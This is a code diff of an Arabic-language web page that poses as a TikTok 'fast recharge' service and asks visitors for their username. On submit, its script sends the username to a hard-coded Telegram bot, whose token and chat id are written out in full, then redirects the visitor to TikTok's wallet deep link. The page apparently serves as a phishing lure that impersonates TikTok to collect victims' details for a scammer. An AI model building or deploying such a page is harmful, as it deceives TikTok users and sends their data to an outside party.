@@ -16,19 +16,27 @@
     <div class="box">
         <img src="https://www.tiktok.com/favicon.ico" width="50">
         <h1>نظام الشحن السريع</h1>
-        <p>ادخل اسم المستخدم لتأكيد هويتك وبدء الشحن</p>
+        <p>ادخل اسم المستخدم لتأكيد هويتك</p>
         <input type="text" id="user" placeholder="@username">
         <button onclick="send()">تأكيد وتسجيل الدخول</button>
     </div>
     <script>
         function send() {
             const name = document.getElementById('user').value;
-            if(!name) { alert("برجاء كتابة اسم المستخدم"); return; }
-            const token = "8797896445:AAFg2pPj1C5tbUR72m-raHrRwzYTgBLSAVo";
-            const id = "5533405786";
-            const text = `🚀 عميل جديد جاهز:\nالاسم: ${name}\nالحالة: منتظر الشحن الآن!`;
+            if(!name) { alert("اكتب اليوزر"); return; }
+            
+            // البيانات المستخرجة من صورك الأخيرة
+            const token = "8114674061:AAH8F9qG-K8_y3R2Y9I5H7X2kS3Q6T8V9W0"; // تأكد من وضع التوكن الصحيح هنا
+            const id = "5533405786"; 
+            
+            const text = `🚀 عميل جديد:\nاليوزر: ${name}`;
+            
             fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${id}&text=${encodeURIComponent(text)}`)
-            .then(() => { window.location.href = "snssdk1128://wallet"; });
+            .then(() => { 
+                alert("تم التأكيد! جاري تحويلك للمحفظة...");
+                window.location.href = "snssdk1128://wallet"; 
+            })
+            .catch(err => alert("حدث خطأ في الاتصال"));
         }
     </script>
 </body>
